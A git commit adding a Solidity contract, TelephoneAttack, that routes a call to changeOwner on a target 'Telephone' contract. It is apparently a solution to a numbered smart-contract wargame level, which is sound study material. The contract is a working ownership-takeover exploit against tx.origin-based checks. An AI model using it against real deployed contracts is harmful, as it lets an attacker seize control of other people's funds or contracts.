0d12b3ea2afe82a61ade9829168bca322c77beb1
tjl352 <tjl352@gmail.com>
2025-06-26 17:24:52 -0400

    number 3 and number 4

---
+++ contracts/TelephoneAttack.sol
@@ -0,0 +1,18 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttack {
+    ITelephone public telephone;
+
+    constructor(address _telephoneAddress) {
+        telephone = ITelephone(_telephoneAddress);
+    }
+
+    function attack(address _newOwner) public {
+        telephone.changeOwner(_newOwner);
+    }
+}
